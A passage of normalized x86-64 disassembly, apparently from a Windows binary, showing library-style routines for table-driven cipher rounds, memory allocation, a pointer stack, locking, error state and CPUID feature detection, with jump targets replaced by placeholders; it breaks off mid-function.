xor ecx [ rbp - 0x10 ]
ror r9d 0x4
mov r8d ecx
shr rcx 0x12
and ecx 0x3f
mov eax r8d
mov edx [ r10 + rcx * 4 + 0x400 ]
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x200 ]
mov eax r8d
shr r8 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 ]
mov eax r9d
shr rax 0x12
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x500 ]
mov eax r9d
shr rax 0xa
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x300 ]
mov eax r9d
shr r9 0x1a
shr rax 0x2
and eax 0x3f
xor edx [ r10 + rax * 4 + 0x100 ]
xor edx [ r10 + r8 * 4 + 0x600 ]
xor edx [ r10 + r9 * 4 + 0x700 ]
xor ebx edx
dec rsi
jne r-xdata
jmp r-xdata
sub_140034910
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
mov eax 0x30
call sub_14003d700
sub rsp rax
mov esi r8d
mov rbp rdx
movsxd rdi ecx
test ecx ecx
jg r-xdata
mov rax [ rw-data ]
xor ecx ecx
mov [ rsp + 0x40 ] rbx
mov [ rw-data ] ecx
test rax rax
je r-xdata
xor eax eax
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rdi
mov r8d esi
mov rdx rbp
call [ rw-data ]
mov rbx rax
mov rax [ rw-data ]
test rax rax
je r-xdata
mov r9d r8d
mov r8 rdx
mov edx edi
mov [ rw-data ] ecx
mov [ rsp + 0x20 ] ecx
call rax
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov r9d esi
mov r8 rbp
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] 0x1
call rax
sub_1400349c0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
mov eax 0x30
call sub_14003d700
sub rsp rax
mov esi r9d
mov rbp r8
movsxd rbx edx
mov r12 rcx
test rcx rcx
jne r-xdata
test edx edx
jg r-xdata
mov r8d r9d
mov rdx rbp
mov ecx ebx
call sub_140034910
jmp r-xdata
mov rax [ rw-data ]
mov [ rsp + 0x40 ] rdi
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov rdx rbx
mov r9d esi
mov r8 rbp
mov rcx r12
call [ rw-data ]
mov rdi rax
mov rax [ rw-data ]
test rax rax
je r-xdata
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] r9d
mov r9 r8
mov r8d ebx
xor edx edx
call rax
mov rax rdi
mov rdi [ rsp + 0x40 ]
mov r9 rbp
mov r8d ebx
mov rdx rdi
mov rcx r12
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] esi
call rax
sub_140034a90
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rax [ rw-data ]
mov rbx rcx
test rax rax
je r-xdata
mov rcx rbx
call [ rw-data ]
mov r11 [ rw-data ]
test r11 r11
je r-xdata
xor edx edx
call rax
add rsp 0x20
pop rbx
retn
mov edx 0x1
xor ecx ecx
call r11
sub_140034ae0
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
lea r8d [ rax + 0x5d ]
lea rdx [ rw-data ]
mov ecx eax
call sub_140034910
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov r8d 0x7f
lea rdx [ rw-data ]
lea ecx [ r8 - 0x5f ]
call sub_140034910
mov [ rbx + 0x8 ] rax
test rax rax
jne r-xdata
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x8 ]
mov [ rax + 0x8 ] rcx
mov rax [ rbx + 0x8 ]
mov [ rax + 0x10 ] rcx
mov rax [ rbx + 0x8 ]
mov [ rax + 0x18 ] rcx
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x14 ] 0x4
mov [ rbx ] ecx
mov [ rbx + 0x10 ] ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_140034a90
sub_140034b80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
movsxd rdi r8d
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
mov eax [ rcx ]
mov edx [ rcx + 0x14 ]
inc eax
cmp edx eax
jg r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
movsxd rax [ rbx ]
cmp edi eax
jge r-xdata
mov rcx [ rcx + 0x8 ]
lea r8 [ rw-data ]
shl edx 0x4
mov r9d 0x96
call sub_1400349c0
test rax rax
je r-xdata
mov rcx rax
mov rax [ rbx + 0x8 ]
mov [ rax + rcx * 8 ] rsi
test edi edi
js r-xdata
mov [ rbx + 0x8 ] rax
mov eax [ rbx + 0x14 ]
add eax eax
mov [ rbx + 0x14 ] eax
mov r8 [ rbx + 0x8 ]
mov rdx rax
lea r10 [ r8 + 0x8 ]
cmp rax rdi
jl r-xdata
mov rax [ rbx + 0x8 ]
mov [ rax + rdi * 8 ] rsi
jmp r-xdata
sub rdx rdi
sub r8 r10
lea rcx [ r10 + rax * 8 ]
inc rdx
nop [ rax + rax ] ax
inc [ rbx ]
mov eax [ rbx ]
mov rsi [ rsp + 0x38 ]
mov [ rbx + 0x10 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ r8 + rcx ]
sub rcx 0x8
dec rdx
mov [ rcx + 0x8 ] rax
jne r-xdata
sub_140034c90
test rcx rcx
je r-xdata
retn
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140034a90
add rsp 0x20
pop rbx
call sub_140034a90
sub_140034d00
test rcx rcx
je r-xdata
xor eax eax
retn
test edx edx
js r-xdata
cmp edx [ rcx ]
jge r-xdata
mov rax [ rcx + 0x8 ]
movsxd rdx edx
mov [ rax + rdx * 8 ] r8
mov rax r8
retn
sub_140034d40
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x18 ] rbx
push rbp
mov eax 0x20
call sub_14003d700
sub rsp rax
mov [ rsp + 0x38 ] rdi
xor edi edi
mov rbp rdx
mov rbx rcx
cmp [ rcx ] edi
jle r-xdata
mov rcx [ rbx + 0x8 ]
mov rdi [ rsp + 0x38 ]
test rcx rcx
je r-xdata
mov [ rsp + 0x30 ] rsi
mov esi edi
mov rcx rbx
call sub_140034a90
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rbp
call sub_140034a90
inc edi
add rsi 0x8
cmp edi [ rbx ]
jl r-xdata
mov rcx [ rcx + rsi ]
call rbp
mov rcx [ rbx + 0x8 ]
cmp [ rcx + rsi ] 0x0
je r-xdata
mov rsi [ rsp + 0x30 ]
sub_140034dc0
xor eax eax
mov r10d eax
cmp r8 0x1
jbe r-xdata
test r8 r8
je r-xdata
nop [ rax + rax ] eax
cmp [ rdx ] al
je r-xdata
mov [ rcx ] al
dec r8
mov [ rcx ] r9b
inc rcx
inc rdx
inc r10
cmp r8 0x1
ja r-xdata
btr eax 0x1f
add rax r10
retn
nop [ rax ] eax
movzx r9d [ rdx ]
test r9b r9b
je r-xdata
inc rdx
inc eax
cmp [ rdx ] 0x0
jne r-xdata
cmp eax 0x80000000
jae r-xdata
sub_140034e20
xor eax eax
mov r10d eax
test r8 r8
je r-xdata
mov r11 rax
cmp r8 0x1
jbe r-xdata
nop [ rax + rax ] ax
test r8 r8
je r-xdata
nop [ rax + rax ] eax
inc r10
inc rcx
dec r8
jne r-xdata
cmp [ rdx ] al
je r-xdata
mov [ rcx ] al
dec r8
mov [ rcx ] r9b
inc rcx
inc rdx
inc r11
cmp r8 0x1
ja r-xdata
cmp [ rcx ] al
je r-xdata
btr eax 0x1f
add rax r11
add rax r10
retn
nop [ rax ] eax
movzx r9d [ rdx ]
test r9b r9b
je r-xdata
inc rdx
inc eax
cmp [ rdx ] 0x0
jne r-xdata
cmp eax 0x80000000
jae r-xdata
sub_140034ea0
mov eax 0x28
call sub_14003d700
sub rsp rax
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
lea r8 [ rw-data ]
lea edx [ rax - 0x27 ]
lea ecx [ rax - 0x1f ]
mov r9d 0x127
call sub_1400343a0
mov rax [ rw-data ]
mov edx 0x1
test rax rax
lea r11 [ r--data ]
lea r8 [ rw-data ]
cmovne r11 rax
lea ecx [ rdx + 0x9 ]
mov r9d 0x12a
mov [ rw-data ] r11
call sub_1400343a0
sub_140034f10
mov eax [ rcx ]
mov r8d eax
shr r8d 0xc
xor r8d eax
shr r8d 0xc
and r8d 0xfff
xor r8d eax
mov eax 0xaf286bcb
mov ecx r8d
mul r8d
sub ecx edx
mov eax r8d
shr ecx 0x1
add ecx edx
shr ecx 0x4
imul ecx ecx 0x13
sub eax ecx
imul eax eax 0xd
xor eax r8d
retn
sub_140034f50
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edi ecx
lea r8 [ rw-data ]
lea edx [ rax - 0x1f ]
lea ecx [ rax - 0x17 ]
mov r9d 0x162
xor ebx ebx
call sub_1400343a0
mov r11 [ rw-data ]
test r11 r11
jne r-xdata
mov rbx r11
test edi edi
je r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x16b
lea ecx [ rdx + 0x9 ]
call sub_1400343a0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov r8d 0x165
call sub_140035d90
lea rdx [ sub_140036e10 ]
lea rcx [ sub_140034f10 ]
call sub_140036490
mov [ rw-data ] rax
call sub_140035fc0
mov r11 [ rw-data ]
test r11 r11
je r-xdata
sub_140035000
mov eax 0x28
call sub_14003d700
sub rsp rax
lea r8 [ rw-data ]
lea edx [ rax - 0x27 ]
lea ecx [ rax - 0x1f ]
mov r9d 0x172
call sub_1400343a0
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x178
lea ecx [ rdx + 0x9 ]
add rsp 0x28
jmp sub_1400343a0
call sub_140036150
mov [ rw-data ] 0x0
sub_140035060
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
call sub_140034ea0
mov rax [ rw-data ]
xor ecx ecx
call [ rax ]
mov rbx rax
test rax rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x185
lea ecx [ rdx + 0x4 ]
call sub_1400343a0
mov rdx rdi
mov rcx rbx
call sub_1400367a0
mov edx 0x1
lea r8 [ rw-data ]
lea ecx [ rdx + 0x5 ]
mov r9d 0x187
mov rbx rax
call sub_1400343a0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1400350f0
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
call sub_140034ea0
mov rax [ rw-data ]
mov ecx 0x1
call [ rax ]
mov rbx rax
test rax rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x196
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
mov rdx rdi
mov rcx rbx
call sub_1400365a0
mov edx 0x1
lea r8 [ rw-data ]
lea ecx [ rdx + 0x9 ]
mov r9d 0x198
mov rbx rax
call sub_1400343a0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140035180
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
call sub_140034ea0
mov rax [ rw-data ]
xor ecx ecx
call [ rax ]
mov rbx rax
test rax rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x1a7
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
mov rdx rdi
mov rcx rbx
call sub_1400366b0
mov edx 0x1
lea r8 [ rw-data ]
lea ecx [ rdx + 0x9 ]
mov r9d 0x1a9
mov rbx rax
call sub_1400343a0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140035250
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edi ecx
lea r8 [ rw-data ]
lea edx [ rax - 0x1f ]
lea ecx [ rax - 0x17 ]
mov r9d 0x1be
xor ebx ebx
call sub_1400343a0
mov r11 [ rw-data ]
test r11 r11
jne r-xdata
inc [ rw-data ]
mov rbx r11
test edi edi
je r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x1ca
lea ecx [ rdx + 0x9 ]
call sub_1400343a0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov r8d 0x1c1
call sub_140035d90
lea rdx [ sub_140035230 ]
lea rcx [ sub_140035210 ]
call sub_140036490
mov [ rw-data ] rax
call sub_140035fc0
mov r11 [ rw-data ]
test r11 r11
je r-xdata
sub_140035310
test rcx rcx
je r-xdata
retn
push rbx
mov eax 0x30
call sub_14003d700
sub rsp rax
cmp [ rcx ] 0x0
mov rbx rcx
je r-xdata
add rsp 0x30
pop rbx
lea r9 [ rw-data ]
lea r8d [ rax - 0x2f ]
lea rcx [ rw-data ]
or edx 0xffffffff
mov [ rsp + 0x20 ] 0x1d5
call sub_140034460
test eax eax
jg r-xdata
mov [ rbx ] 0x0
sub_140035360
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
call sub_140034ea0
mov rax [ rw-data ]
xor ecx ecx
call [ rax + 0x28 ]
mov [ rsp + 0x38 ] rax
test rax rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x1ef
lea ecx [ rdx + 0x4 ]
call sub_1400343a0
mov rcx [ rsp + 0x38 ]
mov rdx rbx
call sub_1400367a0
mov edx 0x1
lea r8 [ rw-data ]
lea ecx [ rdx + 0x5 ]
mov r9d 0x1f1
mov rbx rax
call sub_1400343a0
mov rdx [ rw-data ]
lea rcx [ rsp + 0x38 ]
call [ rdx + 0x30 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
sub_1400353f0
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
call sub_140034ea0
mov rax [ rw-data ]
mov ecx 0x1
call [ rax + 0x28 ]
mov [ rsp + 0x38 ] rax
test rax rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x201
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
mov rcx [ rsp + 0x38 ]
mov rdx rbx
call sub_1400365a0
mov edx 0x1
lea r8 [ rw-data ]
lea ecx [ rdx + 0x9 ]
mov r9d 0x203
mov rbx rax
call sub_1400343a0
mov rdx [ rw-data ]
lea rcx [ rsp + 0x38 ]
call [ rdx + 0x30 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
retn
sub_140035490
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
lea r8 [ rw-data ]
lea edx [ rax - 0x1f ]
lea ecx [ rax - 0x17 ]
mov r9d 0x227
call sub_1400343a0
mov r11d [ rw-data ]
mov edx 0x1
mov ebx r11d
inc r11d
lea r8 [ rw-data ]
lea ecx [ rdx + 0x9 ]
mov r9d 0x229
mov [ rw-data ] r11d
call sub_1400343a0
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_1400354f0
test rcx rcx
je r-xdata
retn
push rbp
mov eax 0x20
call sub_14003d700
sub rsp rax
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x48 ] r12
mov rbp rcx
lea rbx [ rcx + 0x110 ]
xor r12d r12d
lea rdi [ rcx + 0x90 ]
lea esi [ rax - 0x10 ]
mov [ rbx ] r12d
add rbx 0x4
add rdi 0x8
dec rsi
jne r-xdata
test [ rbx ] 0x1
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rcx rbp
call sub_140034a90
mov r12 [ rsp + 0x48 ]
mov rdi [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rbp
call sub_140034a90
mov [ rdi ] r12
sub_140035580
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x260
call sub_14003d700
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x250 ] rax
call sub_140034ea0
lea rcx [ rsp + 0x20 ]
call sub_140033e30
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_140033eb0
mov rax [ rw-data ]
lea rcx [ rsp + 0x30 ]
call [ rax + 0x38 ]
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
lea rdx [ rw-data ]
mov r8d 0x3fb
mov ecx 0x218
call sub_140034910
mov rbx rax
test rax rax
je r-xdata
lea rax [ rw-data ]
jmp r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rax
call sub_140033eb0
xor r11d r11d
lea rax [ rbx + 0x110 ]
mov [ rbx + 0x210 ] r11
lea rcx [ rbx + 0x90 ]
lea edx [ r11 + 0x10 ]
nop [ rax + rax ] ax
mov rcx [ rsp + 0x250 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x270 ]
add rsp 0x260
pop rdi
retn
mov [ rcx ] r11
mov [ rax ] r11d
add rax 0x4
add rcx 0x8
dec rdx
jne r-xdata
mov rax [ rw-data ]
mov rcx rbx
call [ rax + 0x40 ]
mov rdx [ rw-data ]
mov rcx rbx
mov rdi rax
call [ rdx + 0x38 ]
cmp rax rbx
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call sub_1400354f0
mov rcx rdi
call sub_1400354f0
sub_1400356b0
mov [ rsp + 0x8 ] ecx
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rsi
push r13
mov eax 0x48
call sub_14003d700
sub rsp rax
lea rdx [ rw-data ]
lea ecx [ rax + 0x9 ]
mov r8d 0x431
lea r13d [ rax + 0x8 ]
call sub_140034910
mov rsi rax
test rax rax
je r-xdata
add rsp 0x48
pop r13
pop rsi
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rdi
mov [ rax ] 0x0
mov ecx [ rsp + 0x60 ]
xor ebp ebp
xor edi edi
mov [ rsp + 0x28 ] r12
lea r12 [ rsp + 0x68 ]
test ecx ecx
jle r-xdata
call sub_140035580
mov rbx rax
mov ecx [ rax + 0x210 ]
mov eax 0xf
test ecx ecx
cmove ecx eax
movsxd rdi ecx
mov rcx [ rbx + rdi * 8 + 0x90 ]
test rcx rcx
je r-xdata
add r12 0xfffffffffffffff8
nop [ rax + rax ] eax
mov [ rbx + rdi * 8 + 0x90 ] rsi
mov [ rbx + rdi * 4 + 0x110 ] 0x3
test [ rbx + rdi * 4 + 0x110 ] 0x1
je r-xdata
inc edi
cmp edi ecx
jl r-xdata
xor eax eax
mov rcx rbx
cmp [ rbx ] al
je r-xdata
call sub_140034a90
mov [ rbx + rdi * 8 + 0x90 ] 0x0
mov rbx [ r12 + 0x8 ]
add r12 0x8
test rbx rbx
je r-xdata
btr eax 0x1f
add ebp eax
cmp ebp r13d
jle r-xdata
cmp eax 0x80000000
jae r-xdata
movsxd r8 r13d
mov rdx rbx
mov rcx rsi
inc r8
call sub_140034e20
mov ecx [ rsp + 0x60 ]
lea r13d [ rbp + 0x14 ]
lea r8 [ rw-data ]
mov r9d 0x441
lea edx [ r13 + 0x1 ]
mov rcx rsi
call sub_1400349c0
test rax rax
je r-xdata
inc rcx
inc eax
cmp [ rcx ] 0x0
jne r-xdata
mov rcx rsi
call sub_140034a90
jmp r-xdata
mov rsi rax
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x40 ]
mov r12 [ rsp + 0x28 ]
sub_140035830
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
call sub_140034ea0
mov rax [ rw-data ]
xor ecx ecx
call [ rax + 0x28 ]
mov [ rsp + 0x38 ] rax
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x213
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
mov rcx [ rsp + 0x38 ]
mov rdx rbx
call sub_1400366b0
cmp [ rw-data ] 0x1
mov rbx rax
jne r-xdata
mov edx 0x1
lea r8 [ rw-data ]
mov r9d 0x21c
lea ecx [ rdx + 0x9 ]
call sub_1400343a0
mov rax [ rw-data ]
lea rcx [ rsp + 0x38 ]
call [ rax + 0x30 ]
test rbx rbx
je r-xdata
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400354f0
call sub_140036480
test eax eax
jne r-xdata
mov rcx [ rw-data ]
call sub_140036150
mov [ rw-data ] 0x0
sub_140035900
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbp r9
mov esi r8d
mov edi edx
mov r12d ecx
call sub_140035580
mov rbx rax
mov eax [ rax + 0x210 ]
inc eax
and eax 0x8000000f
jge r-xdata
mov ecx [ rbx + 0x214 ]
mov [ rbx + 0x210 ] eax
cmp eax ecx
jne r-xdata
dec eax
or eax 0xfffffff0
inc eax
cdqe
and edi 0xfff
xor r13d r13d
mov [ rbx + rax * 4 + 0x10 ] r13d
shl edi 0xc
movzx eax r12b
shl eax 0x18
and esi 0xfff
or edi eax
movsxd rax [ rbx + 0x210 ]
or edi esi
mov [ rbx + rax * 4 + 0x50 ] edi
movsxd rax [ rbx + 0x210 ]
mov [ rbx + rax * 8 + 0x150 ] rbp
movsxd rcx [ rbx + 0x210 ]
mov eax [ rsp + 0x60 ]
mov [ rbx + rcx * 4 + 0x1d0 ] eax
movsxd rcx [ rbx + 0x210 ]
cmp [ rbx + rcx * 8 + 0x90 ] r13
je r-xdata
inc ecx
and ecx 0x8000000f
jge r-xdata
movsxd rax [ rbx + 0x210 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov [ rbx + rax * 4 + 0x110 ] r13d
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
test [ rbx + rcx * 4 + 0x110 ] 0x1
je r-xdata
mov [ rbx + 0x214 ] ecx
dec ecx
or ecx 0xfffffff0
inc ecx
mov rcx [ rbx + rcx * 8 + 0x90 ]
call sub_140034a90
movsxd r11 [ rbx + 0x210 ]
mov [ rbx + r11 * 8 + 0x90 ] r13
sub_140035a70
mov r8 rbx
xor eax eax
cpuid
mov r11d eax
xor eax eax
cmp ebx 0x756e6547
setne al
mov r9d eax
cmp edx 0x49656e69
setne al
or r9d eax
cmp ecx 0x6c65746e
setne al
or r9d eax
je r-xdata
cmp r11d 0x4
mov r10d 0xffffffff
jb r-xdata
cmp ebx 0x68747541
setne al
mov r10d eax
cmp edx 0x69746e65
setne al
or r10d eax
cmp ecx 0x444d4163
setne al
or r10d eax
jne r-xdata
mov eax 0x1
cpuid
cmp r9d 0x0
jne r-xdata
mov eax 0x4
mov ecx 0x0
cpuid
mov r10d eax
shr r10d 0xe
and r10d 0xfff
mov eax 0x80000000
cpuid
cmp eax 0x80000008
jb r-xdata
bt edx 0x1c
jae r-xdata
or edx 0x100000
and ah 0xf
cmp ah 0xf
je r-xdata
mov eax 0x80000008
cpuid
movzx r10 cl
inc r10
mov eax 0x1
cpuid
bt edx 0x1c
jae r-xdata
shl rcx 0x20
mov eax edx
mov rbx r8
or rax rcx
retn
and edx 0xefffffff
cmp r10d 0x0
je r-xdata
or edx 0x40000000
shr ebx 0x10
cmp bl r10b
ja r-xdata
or edx 0x10000000
shr ebx 0x10
cmp bl 0x1
ja r-xdata
and edx 0xefffffff
jmp r-xdata
and edx 0xefffffff
sub_140035b80
xor rax rax
cmp rdx 0xf
jae r-xdata
test rcx 0x7
je r-xdata
cmp rdx 0x0
je r-xdata
mov [ rcx ] rax
lea rdx [ rdx - 0x8 ]
test rdx 0xfffffffffffffff8
lea rcx [ rcx + 0x8 ]
jne r-xdata
mov [ rcx ] al
lea rdx [ rdx - 0x1 ]
lea rcx [ rcx + 0x1 ]
jmp r-xdata
retn
mov [ rcx ] al
sub rdx 0x1
lea rcx [ rcx + 0x1 ]
jne r-xdata
cmp rdx 0x0
jne r-xdata
retn
sub_140035be0
pxor xmm0 xmm0
pxor xmm1 xmm1
pxor xmm2 xmm2
pxor xmm3 xmm3
pxor xmm4 xmm4
pxor xmm5 xmm5
xor rcx rcx
xor rdx rdx
xor r8 r8
xor r9 r9
xor r10 r10
xor r11 r11
lea rax [ rsp + 0x8 ]
retn
sub_140035c20
push rbx
mov eax 0x30
call sub_14003d700
sub rsp rax
xor ebx ebx
test [ rw-data ] 0x1
je r-xdata
mov eax ebx
add rsp 0x30
pop rbx
retn
lea rcx [ rsp + 0x20 ]
call sub_140033e30
lea r8 [ rw-data ]
lea edx [ rbx + 0x14 ]
lea ecx [ rbx + 0x5 ]
mov r9d 0x126
call sub_1400343a0
test [ rw-data ] 0x2
jne r-xdata
mov ebx 0x1
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_140033e90
test eax eax
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0x12b
lea ecx [ rdx - 0xe ]
call sub_1400343a0
sub_140035cb0
mov eax 0x28
call sub_14003d700
sub rsp rax
call sub_140033ec0
mov edx eax
mov ecx eax
shr edx 0x4
shr ecx 0xe
imul eax eax 0x45bb
imul edx edx 0xfb
imul ecx ecx 0x7
add edx ecx
add eax edx
add rsp 0x28
retn
sub_140035cf0
mov eax 0x68
call sub_14003d700
sub rsp rax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x68
retn
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x70 ] rbx
call sub_140033e30
mov rcx [ rw-data ]
lea rdx [ rsp + 0x20 ]
call sub_1400366b0
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x68
retn
mov [ rsp + 0x60 ] rdi
mov rdi [ rax + 0x28 ]
test rdi rdi
je r-xdata
dec [ rbx + 0x30 ]
cmp [ rbx + 0x30 ] 0x0
jg r-xdata
mov rcx [ rw-data ]
inc [ rdi + 0x30 ]
mov rdx rdi
call sub_1400365a0
mov rdi [ rsp + 0x60 ]
mov rax rbx
mov [ rbx + 0x28 ] 0x0
test rdi rdi
je r-xdata
mov rcx rbx
call sub_140034a90
dec [ rdi + 0x30 ]
sub_140035d90
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
mov eax 0x30
call sub_14003d700
sub rsp rax
mov edi r8d
mov rsi rdx
mov rbp rcx
call sub_140035c20
test eax eax
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
xor eax eax
add rsp 0x30
pop rdi
retn
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0xdc
lea ecx [ rdx - 0xb ]
mov [ rsp + 0x40 ] rbx
call sub_1400343a0
test [ rw-data ] 0x1
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0x11a
lea ecx [ rdx - 0xa ]
call sub_1400343a0
lea rdx [ rw-data ]
mov r8d 0x196
mov ecx 0x38
call sub_140034910
mov rbx rax
test rax rax
je r-xdata
lea rcx [ rsp + 0x20 ]
call sub_140033e30
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0xdc
lea ecx [ rdx - 0xb ]
call sub_1400343a0
mov r11d [ rw-data ]
mov rbx [ rsp + 0x40 ]
test r11b 0x1
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0xfa
lea ecx [ rdx - 0xa ]
call sub_1400343a0
mov edx 0x1b
lea r8 [ rw-data ]
lea ecx [ rdx - 0x12 ]
mov r9d 0x100
call sub_1400343a0
mov edx 0x14
lea r8 [ rw-data ]
lea ecx [ rdx - 0xb ]
mov r9d 0x101
call sub_1400343a0
and [ rw-data ] 0xfffffffd
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_140033eb0
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_140033e90
test eax eax
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0x11a
lea ecx [ rdx - 0xa ]
call sub_1400343a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov rcx rbx
call sub_140033e30
mov rcx [ rw-data ]
mov rdx rbx
